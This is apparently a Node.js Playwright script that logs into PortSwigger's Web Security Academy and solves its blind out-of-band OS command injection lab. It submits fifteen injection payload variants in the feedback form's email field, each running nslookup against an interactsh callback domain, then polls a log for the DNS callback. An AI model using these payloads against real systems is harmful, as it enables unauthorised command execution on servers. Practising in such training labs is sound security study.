#!/usr/bin/env node
/**
 * OSCmd #4 - Try interactsh OOB
 * Multiple payload variants tested in sequence
 */
const { chromium } = require('playwright');
const { readFileSync } = require('fs');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;
const LAB_PAGE = 'https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band';
const INTERACTSH_DOMAIN = 'd7lns342olvugbcqmrsgtbseutaq3zpkw.oast.online';

async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function checkInteractshLog(marker) {
  try {
    const log = readFileSync('/tmp/interactsh.log', 'utf8');
    return log.toLowerCase().includes(marker.toLowerCase());
  } catch { return false; }
}

async function main() {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  
  try {
    console.log('[*] Login PortSwigger...');
    await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
    await page.fill('#EmailAddress', EMAIL);
    await page.fill('#Password', PASSWORD);
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
      page.click('#Login'),
    ]);
    await sleep(2000);
    
    console.log('[*] Launch lab...');
    await page.goto(LAB_PAGE, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await sleep(3000);
    await (await page.locator('a:has-text("ACCESS THE LAB")').first()).click();
    await sleep(40000);
    
    let labUrl = null, labPage = null;
    for (const p of ctx.pages()) {
      const u = p.url();
      if (u.includes('web-security-academy.net')) {
        labUrl = u.replace(/\/$/, '');
        labPage = p;
        break;
      }
    }
    if (!labUrl) throw new Error('No lab URL');
    console.log('[+] Lab:', labUrl);
    
    // Get feedback page CSRF
    await labPage.goto(labUrl + '/feedback', { waitUntil: 'domcontentloaded', timeout: 15000 });
    await sleep(2000);
    
    const csrf = await labPage.locator('input[name=csrf]').first().getAttribute('value').catch(() => '');
    console.log('[+] CSRF:', csrf);
    
    // Try ALL payload variations
    const marker = 'oscmd4-' + Date.now().toString(36);
    const subdomain = `${marker}.${INTERACTSH_DOMAIN}`;
    
    const payloads = [
      `||nslookup ${subdomain}||`,
      `||nslookup+${subdomain}||`,
      `&&nslookup ${subdomain}&&`,
      `;nslookup ${subdomain};`,
      `\`nslookup ${subdomain}\``,
      `$(nslookup ${subdomain})`,
      `|nslookup ${subdomain}|`,
      ` ;nslookup ${subdomain};`,
      `\nnslookup ${subdomain}\n`,
      `email@example.com|nslookup ${subdomain}`,
      `>$(nslookup ${subdomain})`,
      `'||nslookup ${subdomain}||'`,
      `"||nslookup ${subdomain}||"`,
      `\${nslookup ${subdomain}}`,
      `<%nslookup ${subdomain}%>`,
    ];
    
    for (const payload of payloads) {
      const res = await labPage.evaluate(async ({ csrf, payload }) => {
        const body = new URLSearchParams({
          csrf, name: 'test', email: payload, subject: 'test', message: 'test'
        });
        const r = await fetch('/feedback/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: body.toString(),
        });
        return r.status;
      }, { csrf, payload });
      console.log(`  Payload "${payload.substring(0, 30)}..." => ${res}`);
      await sleep(2500);
    }
    
    console.log('[*] Waiting 90s for OOB callback...');
    for (let i = 0; i < 18; i++) {
      await sleep(5000);
      if (checkInteractshLog(marker)) {
        console.log('[+] CALLBACK RECEIVED!');
        break;
      }
    }
    
    // Verify
    console.log('[*] Verifying...');
    await page.goto(LAB_PAGE, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await sleep(3000);
    const html = await page.content();
    const solved = html.includes('is-solved') || html.includes('Congratulations');
    console.log(solved ? 'SOLVED' : 'NOT SOLVED');
    process.exit(solved ? 0 : 1);
  } catch (e) {
    console.error(e.message);
    console.log('NOT SOLVED');
    process.exit(1);
  } finally {
    await browser.close().catch(() => {});
  }
}

main();
